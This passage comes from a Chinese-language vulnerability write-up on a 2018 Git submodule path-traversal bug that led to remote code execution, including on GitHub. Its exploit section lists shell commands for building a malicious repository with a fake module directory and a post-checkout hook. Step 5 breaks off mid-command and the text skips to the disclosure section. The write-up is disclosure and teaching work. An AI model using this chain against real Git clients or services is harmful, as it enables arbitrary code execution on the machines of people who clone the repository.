    Cloning into '/tmp/c/v/subs/submod'...
    remote: Counting objects: 274, done.        
    remote: Compressing objects: 100% (227/227), done.        
    remote: Total 274 (delta 14), reused 268 (delta 8), pack-reused 0        
    Receiving objects: 100% (274/274), 44.03 KiB | 392.00 KiB/s, done.
    Resolving deltas: 100% (14/14), done.
    Submodule path 'submod': checked out 'cc0db68d85f7ce60a51c62bf451d7575e5a9a89e'
    Submodule path 'submod': checked out 'cc0db68d85f7ce60a51c62bf451d7575e5a9a89e'
回想一下，我之前曾经提到过，这个遍历漏洞允许我覆盖任意文件夹。而这正是我们失败的原因，子模块尝试在我们伪造的位置初始化子模块仓库，但此时文件夹已经存在，所以它会删除其中的内容，并且尝试。这样一来，就会覆盖我们所特制的攻击，该钩子也永远不会触发。
    fatal: /tmp/c/v/subs/.git/modules/../../fakegit/modules/submod already exists
    fatal: clone of 'https://github.com/staaldraad/repository.git' into submodule path '/tmp/c/v/subs/submod' failed
    Failed to clone 'submod'. Retry scheduled
    Cloning into '/tmp/c/v/subs/submod'...
事已至此，我不打算放弃，接下来我们要解决的问题就只是“防止Git覆盖钩子”。在不断尝试的过程中，我多次遇到了失败，即使使用了第二个子模块成功写入文件夹，最终也会被覆盖。
###  3.4 解决钩子被覆盖的问题
经过多次尝试后，我开始回顾之前的操作。在之前，我总是为第二个子模块选择了第一个子模块字母顺序之后的路径。这就意味着，第一个模块将尝试被创建，失败后第二个模块将被添加，然后第一个模块会被再次复制。在尝试不同的攻击方法时，我无意中将第二个模块的路径修改成了字母顺序在第一个模块之前，即第二个路径是mod1，第一个路径是submod。  
就这一个小小的变化，却触发了一个新的代码路径，而我之前并没有想到会发生这样的情况。当$GIT_DIR/modules中存在一个或多个子模块时，我们的遍历子模块不会覆盖任何文件。通过第二个子模块的初始化过程，就可以创建$GIT_DIR/modules/mod目录，同时将fakegit/modules/submod作为有效路径接受，并且不发生覆盖的情况。这样一来，钩子就仍然存在，我们可以触发钩子！
## 四、漏洞利用
###  4.1 漏洞利用过程
目前，思路已经清晰，接下来就要整合攻击链了。要利用这一漏洞，需要我们创建“恶意”的仓库，我们的目标将会对其进行复制。  
1、首先创建Repo：
    mkdir badrepo
    cd badrepo
    git init
    git remote add origin https://github.com/staaldraad/demosub.git
2、通过我们的目录遍历，寻找子模块创建所需的文件夹：
    mkdir -p fakegit/modules
3、添加两个子模块（其中的内容不重要，只需要权限设置为公开/可复制）：
    git submodule add https://github.com/staaldraad/repository.git submod
    git submodule add https://github.com/staaldraad/repository.git aaa
4、从.git/modules/submod移动伪造子模块的Git仓库：
    mv .git/modules/submod fakegit/modules/submod
5、在伪造Git中，创建我们的钩子，需要是一个有效的Bash脚本：
    cat > fakegit/modules/submod/hooks/post-checkout  ）。  
要测试该漏洞是否适用于GitHub非常简单，只要对我们的脚本稍作修改，使其不再ping
localhost，而是与我控制的主机进行反向连接，然后在仓库上启用GitHub页面。  
最终，我们取得了成功。经过快速验证，该IP地址确实来自GitHub，现在我们就证明了GitHub存在远程代码执行漏洞。  
针对GitHub上存在的漏洞，我没有尝试进一步利用，而是及时向GitHub提交了报告。我建议需要特别注意在Docker容器中的非特权用户，需要限制其攻击面和进一步利用漏洞的机会，并且阻止对其他用户数据的访问。  
我将这一问题报告给GitHub后，得到了及时有效的回应。在6月3日（周日）早上我提交了该问题，GitHub团队在收到报告后的3小时就进行了漏洞分类，并进行了临时修复。他们的BugBounty计划非常有效，同时GitHub团队还协助将相关问题提交给git-core并申请到了CVE编号。
###  5.2 边缘案例
当我尝试对2.13.6版本的Git进行漏洞测试时，我同时还请了一个朋友[@Saif_Sherei](https://github.com/Saif_Sherei
"@Saif_Sherei")（ 
）在他的盒子上测试这一漏洞，但他却没能成功利用该漏洞。他安装了2.7.4版本的Git，成功触发了漏洞攻击，但在复制过程中，工作树目录被添加了额外的….，有效防止了漏洞的利用。在漏洞披露后，Tony
Torralba（  ）复现了2.7.4版本Git上的漏洞。我强烈建议各位读者阅读他的文章（
 ），并学习他的思路和符号链接技巧，以对这一漏洞有更为完整的认识。
###  5.3 其他操作系统
需要指出的是，该漏洞不仅可以通过Git For Linux进行利用，同时也可以在macOS和Windows上利用。Microsoft Visual
Studio服务团队在其发布的补丁公告中包含了一个可用于macOS的PoC。  
## 六、漏洞修复
针对该漏洞，已于2018年5月29日发布Git补丁。在该补丁中，不仅解决了客户端漏洞，而且还引入了一个防止Git服务器传递“恶意”gitmodule对象的选项。该选项并没有默认启用，但可以通过切换到transfer.fsckObjects来启用。更多信息请阅读：
https://public-inbox.org/git/PI:EMAIL/ 。  
上述修复目前已经在大多数主要托管服务器上完成，包括GitHub、GitLab、Microsoft Visual
Studio团队服务。我们非常开心看到不同组织能够共同协作，修复这一漏洞，并保护终端用户。  
以下版本已经进行了安全更新，建议广大用户更新到不受该漏洞影响的版本：  
v2.17.1（最新）  
v2.16.4  
v2.15.2  
v2.14.4  
v2.13.7  
感谢GitHub安全团队对此漏洞的报告及披露过程提供的协助，也感谢Git的维护人员能进行快速响应和修复。  
Edward Thomson还写了一篇很棒的文章，详细介绍了如何在各种平台上更新Git，并提供了验证自己是否受该漏洞影响的方法，强烈推荐阅读这篇文章：
 。  
Git团队还为这一漏洞创建了一个测试脚本，该脚本使用内置的Git命令进行漏洞利用尝试，并且跳过了我所经历的一些不必要的步骤：
。
## 七、参考文章
[https://marc.info/?l=git&m=152761328506724&w=2](https://marc.info/?l=git&m=152761328506724&w=2)  